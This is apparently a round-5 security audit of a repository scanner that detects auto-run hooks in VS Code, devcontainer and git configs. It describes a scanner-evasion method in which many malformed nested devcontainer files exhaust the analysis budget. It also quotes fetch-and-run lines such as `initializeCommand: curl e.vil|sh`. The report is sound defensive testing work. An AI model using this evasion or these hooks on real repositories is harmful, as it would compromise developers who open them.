# Security Audit Report: autoexec_on_open (Round 5)

## Verdict: ISSUES_FOUND

Scope, as requested: the two round-4 HIGHs and close variants of them. PoCs were built in
`tmp/r5sec` and deleted afterwards. "End-to-end" means the real `repo-scanner.sh --repo
file://...`. `bash tests/test_scanner.sh` exits 0 (31 ✓, "All tests passed successfully!").

## Round-4 HIGH 1: budget starvation

| Case | Result |
|---|---|
| Original PoC: 130 malformed 1 MB root `*.code-workspace` + root `.vscode/tasks.json` folderOpen `curl\|sh` (end-to-end) | **Fixed.** FOUND, rc=1, 53 s. |
| 199 **valid** slow root workspaces + a malicious `0.code-workspace` and `zzz.code-workspace` (analyzer, 90 s budget) | `0.code-workspace` HIGH. `zzz.code-workspace` was not analysed. Result: E "49 files not analysed (budget)" plus "budget exhausted", now listed first. Workspace-vs-workspace only, so MEDIUM (follow-up 1). |
| **Variant: 130 malformed `.devcontainer/cN/devcontainer.json` + malicious `.devcontainer/00/devcontainer.json` (host `initializeCommand: curl e.vil\|sh`)** | **Still exploitable.** See the blocking finding. |

## Round-4 HIGH 2: `.git` config locations

**Fixed.** Every case is detected:
- `config.worktree`
- in-repo `commondir`, with its `config`, `config.worktree` and `hooks/post-checkout`
- `gitdir:` file plus `commondir`
- `commondir` outside the repo (absolute, or relative `../../..`): HIGH
- a symlinked `commondir`: HIGH
- a BOM before the first section
- `include` and `includeIf` (`gitdir:`, `onbranch:`), including the case-insensitive `[Include] Path`, quoted paths with spaces, a symlinked in-repo include, an include inside `.git/`, and include loops (they terminate)
- outside includes (`/etc/...`, `~/...`): WARN

A chained `commondir` (c1 -> c2) is not followed. That matches git, which reads one level.

## Blocking findings

| Severity | Category | Location | Finding | Remediation |
|---|---|---|---|---|
| HIGH | Evasion: tier-0 starvation through nested devcontainer configs | `checks/autoexec/__main__.priority`: tier 0 includes every `.devcontainer/<name>/devcontainer.json`, there is no count cap, and the tolerant re-parse cap only applies to workspaces | `.devcontainer/<name>/` is glob-discovered: the Dev Containers picker lists every subfolder. 130 malformed benign `.devcontainer/cN/devcontainer.json` files (`{"postCreateCommand":{"k":"echo x",…` × 70k, about 0.86 s each through strict, tolerant and lenient parsing) sit in the same tier and depth as the malicious `.devcontainer/00/devcontainer.json`. Discovery order (LIFO pop of a name-sorted listing) puts `00` last, so the budget runs out first. **PoC (end-to-end, 114 MB checkout, 148 KB `.git`):** **`WARN (10 analysis warnings)` ("16 files not analysed (budget)"), 3/100, rc=0.** The host `initializeCommand: curl e.vil\|sh` in the attractively named config is never reported. | (a) Run a cheap, linear pre-pass first over **every** auto-run config path (tier 0 and 1, all devcontainer subfolders, all workspaces): `fallback.literals` plus `auto_run_danger` on the comment-stripped raw text, so any literal HIGH is printed before the expensive handlers run. (b) Order fixed-name files (`.vscode/tasks.json`, `.vscode/settings.json`, `.devcontainer/devcontainer.json`, `.devcontainer.json`, `.envrc`, `.claude/*`) before `.devcontainer/*/devcontainer.json`. (c) Apply the same malformed re-parse cap (20) and a count cap with a scored "not analysed" WARN to nested devcontainers. (d) Optionally score budget exhaustion as high severity, since it only occurs on crafted input. |

## Follow-ups (MEDIUM/LOW, non-blocking)

1. **MEDIUM:** workspace-vs-workspace starvation. A malicious `zzz.code-workspace` behind about 200 valid slow root workspaces gives WARN, with the budget message shown first. Opening a workspace file needs an extra user confirmation in VS Code. The pre-pass in (a) above would also close this.
2. **MEDIUM (carried over):** lenient/tolerant desync. Strings span raw newlines, unlike jsonc-parser, so an unterminated string before the real keys still gives WARN only.
3. **MEDIUM (carried over):** committed `node_modules/.bin` symlink executed by a hook gives CLEAN.
4. **LOW:** analyzer RSS about 590 MB over 60 hostile files. `.envrc` resolution is one level deep. semgrep honours the user's `PYTHONPATH`. `timeout` may be missing on stock macOS (now partly mitigated by the internal budget and per-file slice). Exec-form `initializeCommand` is a false positive. Out of scope: `.idea`, `.zed`, devcontainer `runArgs`/`mounts`/`features`.

## Standard checklist
No secrets, no egress, no host paths in changed files or logs, no new dependencies, no git execution on local targets (verified in round 4), and no skills or MCP changes. `docs/context.md` is untracked: confirm it is meant to be committed.
